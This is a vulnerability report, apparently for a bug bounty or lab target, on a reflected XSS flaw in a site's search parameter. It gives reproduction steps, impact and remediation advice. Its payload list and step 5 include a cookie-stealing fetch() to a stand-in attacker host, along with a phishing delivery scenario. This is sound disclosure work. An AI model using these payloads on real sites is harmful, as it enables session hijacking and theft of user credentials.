## Title
Unauthenticated Reflected XSS in Search Functionality Allows Arbitrary JavaScript Execution

## OWASP - Vulnerability
OWASP Top 10 2025 - A05 Injection

## Summary
An unauthenticated Reflected Cross-Site Scripting (`XSS`) vulnerability exists in the website's search functionality, allowing attackers to execute arbitrary JavaScript in a victim's browser. When a user visits a specially crafted URL containing malicious script in the search query, the server immediately reflects that input back into the HTTP response without proper sanitization or context-aware output encoding

## Vulnerable Endpoint
`https://tutorialrepublic.pwnedbox.site/?q=`

## Payload Used
```
  cybrnoob'"<><script>alert(document.location)</script>
  cybrnoob'"<><script>cosole.error(document.location)</script>
  cybrnoob'"<><script>fetch('https://attacker.tld/steal?c='+document.cookie)</script>
```

## Steps to Reproduce
1. Interact with the search box and observe whether the input `cybrnoob'">` is reflected in the source.
   <img width="1512" height="982" alt="SCR-20261119-jyqv" src="https://github.com/user-attachments/assets/9a9e3c61-fc9a-4b15-b429-9b6a9dc27220" />
2. Check for any other parameters and methods [`GET,POST`] for a wider attack surface.
   <img width="663" height="199" alt="Screenshot 2026-11-19 at 11 01 58 AM" src="https://github.com/user-attachments/assets/611293e2-021e-486d-9655-ffd884f6dc9d" />
3. For the parameters found, check via automation to see if a reflected url path exists.
   <img width="667" height="243" alt="Screenshot 2026-11-19 at 12 39 21 PM" src="https://github.com/user-attachments/assets/d5f60409-a151-44aa-bd7b-276224d8429c" />
4. Inject javascript in the search box to verify if it is executed.
  - Note: `alert(), confirm(), prompt(), console.log(), console.error(), fetch()` all generate valid responses.
     - Here it can be seen that the injected payload executes seamlessly.
  <img width="1512" height="982" alt="SCR-20261119-kjyb" src="https://github.com/user-attachments/assets/f83822c8-ec04-4117-b678-ace72053bc6b" />
  <img width="1512" height="982" alt="SCR-20261119-kffz" src="https://github.com/user-attachments/assets/1e8f2fd1-d271-4bef-8a43-8d38957c1d5f" />
  <img width="1512" height="982" alt="SCR-20261119-kjfa" src="https://github.com/user-attachments/assets/b0f73d09-6773-426c-a777-7f2be1b45336" /> 
5. Craft a weaponized URL (e.g., `https://tutorialrepublic.pwnedbox.site/?q=<script>fetch('https://attacker.tld/steal?c='+document.cookie)</script>`) and deliver it to a victim via phishing, malicious link, or social engineering; upon opening the link, the payload executes in the victim's browser origin without any user interaction beyond clicking the link.

## Impact / Risk
1. An attacker can steal session cookies and impersonate the victim.
2. Malicious script can display fake login forms and steal credentials.
3. The script can redirect users, alter page content, or perform actions on their behalf.

## Recommendation
1. Never trust any user input. Treat the q parameter as untrusted regardless of its source.
2. Sanitize the search input and reject or strip HTML special characters such as <, >, ", ', and &.
3. Apply context-aware HTML encoding on output so reflected input is rendered as text and never as executable markup.
4. Use a vetted encoding library and add a restrictive Content Security Policy with HttpOnly and SameSite cookies as defense in depth.
